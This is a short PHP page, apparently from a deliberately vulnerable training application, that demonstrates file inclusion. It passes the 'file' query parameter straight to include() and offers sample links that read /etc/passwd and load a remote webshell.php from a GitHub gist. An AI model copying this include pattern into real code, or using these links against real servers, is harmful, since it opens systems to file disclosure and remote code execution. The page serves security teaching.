<?php
defined('APP') or die('Access denied');
?>
<h3>File Inclusion</h3>
<a href="?page=file-inclusion&file=outra_pagina.php">Página PHP</a><br />
<a href="?page=file-inclusion&file=/etc/passwd">/etc/passwd</a><br />
<a href="?page=file-inclusion&file=https://www.google.com.br">Google</a><br />
<a href="?page=file-inclusion&file=https://gist.githubusercontent.com/ricardomaia/f57204019bf64715ed6b1f587a7428d7/raw/9183e4f0a38a4d6c5478dbd70ca2ad2b1819cd50/webshell.php">Webshell</a><br />
<hr />
<?php
if (isset($_GET['file'])) {
    $file = $_GET['file'];
    include($file);
}
?>